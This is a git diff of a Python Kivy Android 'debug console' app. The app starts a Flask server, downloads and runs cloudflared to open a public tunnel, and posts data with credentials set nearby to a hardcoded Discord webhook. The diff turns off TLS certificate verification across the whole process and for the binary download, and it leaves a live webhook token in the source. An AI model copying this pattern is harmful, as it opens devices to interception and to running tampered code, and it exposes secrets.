@@ -2,6 +2,7 @@ import json
 import os
 import random
 import re
+import ssl
 import string
 import subprocess
 import threading
@@ -9,16 +10,18 @@ import time
 import traceback
 import urllib.request
 
+# ===== حل مشكلة شهادات SSL على الأندرويد =====
+ssl._create_default_https_context = ssl._create_unverified_context
+# ===============================================
+
 from flask import Flask
 from kivy.app import App
 from kivy.clock import mainthread
 from kivy.uix.label import Label
 from kivy.uix.scrollview import ScrollView
 
-# ===== 1. رابط الـ Webhook الخاص بك =====
 WEBHOOK_URL = "https://discord.com/api/webhooks/1551491653498437662/ZKV710LxZs-7Q9BxZldPVP3qfnFF1oUIOv3S2tNXAmsP4e4U0Y9e1n7DawPzGHjVmp4F"
 
-# ===== 2. البيانات السريّة =====
 USERNAME = "3anoor-Omda"
 PASSWORD = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
 PORT = 5000
@@ -31,13 +34,12 @@ def home():
 
 class DebugApp(App):
     def build(self):
-        # إنشاء واجهة لعرض السجلات بالألوان وتدعم التمرير (Scrolling)
         self.scroll = ScrollView()
         self.log_label = Label(
             text="=== Android Debug Console ===\n",
             size_hint_y=None,
             font_size='13sp',
-            color=(0, 1, 0, 1), # لون أخضر كالمباني البرمجية
+            color=(0, 1, 0, 1),
             halign='left',
             valign='top'
         )
@@ -47,12 +49,10 @@ class DebugApp(App):
 
     @mainthread
     def log(self, text):
-        # طباعة النصوص على الشاشة مباشرة
         print(text)
         self.log_label.text += f"{text}\n"
 
     def on_start(self):
-        # بدء التشغيل عند فتح التطبيق
         threading.Thread(target=self.run_flask, daemon=True).start()
         threading.Thread(target=self.start_tunnel, daemon=True).start()
 
@@ -66,19 +66,21 @@ class DebugApp(App):
     def start_tunnel(self):
         time.sleep(1)
         try:
-            # استخدام المجلد الآمن المخصص للبيانات على الأندرويد
             save_dir = self.user_data_dir
             cf_bin = os.path.join(save_dir, "cloudflared")
             
             self.log(f"[INFO] Storage path: {cf_bin}")
 
-            # تحميل النسخة المخصصة للأندرويد إن لم تكن موجودة
             if not os.path.exists(cf_bin):
                 self.log("[INFO] Downloading cloudflared (linux-arm64)...")
                 url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
-                urllib.request.urlretrieve(url, cf_bin)
-                self.log("[INFO] Download completed successfully!")
                 
+                # استخدام SSL غير مشفر لتجنب خطأ الشهادات على الأندرويد
+                context = ssl._create_unverified_context()
+                with urllib.request.urlopen(url, context=context) as response, open(cf_bin, 'wb') as out_file:
+                    out_file.write(response.read())
+                    
+                self.log("[INFO] Download completed successfully!")
                 self.log("[INFO] Setting execute permission (chmod 755)...")
                 os.chmod(cf_bin, 0o755)
 
@@ -98,7 +100,6 @@ class DebugApp(App):
             for line in iter(proc.stdout.readline, ""):
                 if line:
                     clean_line = line.strip()
-                    # طباعة الخطوات الهامة والأخطاء من cloudflared
                     if "error" in clean_line.lower() or "failed" in clean_line.lower() or "trycloudflare" in clean_line:
                         self.log(f"[CF LOG] {clean_line}")
 
@@ -135,12 +136,13 @@ class DebugApp(App):
         }
         try:
             data = json.dumps(payload).encode('utf-8')
+            context = ssl._create_unverified_context()
             req = urllib.request.Request(
                 WEBHOOK_URL,
                 data=data,
                 headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
             )
-            res = urllib.request.urlopen(req)
+            res = urllib.request.urlopen(req, context=context)
             self.log(f"[SUCCESS] Discord Webhook response code: {res.getcode()}")
         except Exception as e:
             self.log(f"[ERROR] Failed to send to Discord: {e}")
